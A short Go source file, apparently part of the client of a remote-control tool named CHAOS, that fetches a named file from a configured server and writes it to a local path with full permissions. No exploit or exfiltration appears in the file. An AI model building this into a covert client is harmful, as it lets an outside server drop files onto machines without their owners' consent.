package download

import (
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/gateway"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
)

type DownloadService struct {
	Configuration *environment.Configuration
	Gateway       gateway.Gateway
}

func NewDownloadService(configuration *environment.Configuration, gateway gateway.Gateway) services.Download {
	return &DownloadService{
		Configuration: configuration,
		Gateway:       gateway,
	}
}

func (d DownloadService) DownloadFile(filepath string) ([]byte, error) {
	filename := getFilenameFromPath(filepath)
	url := fmt.Sprintf("%s/%s", fmt.Sprint(d.Configuration.Server.URL, d.Configuration.Server.Download), filename)

	res, err := d.Gateway.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	if res.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("request failed with status code: %d", res.StatusCode)
	}

	if err := ioutil.WriteFile(filepath, res.ResponseBody, os.ModePerm); err != nil {
		return nil, err
	}
	return []byte(filename), nil
}

func getFilenameFromPath(path string) string {
	return filepath.Base(path)
}
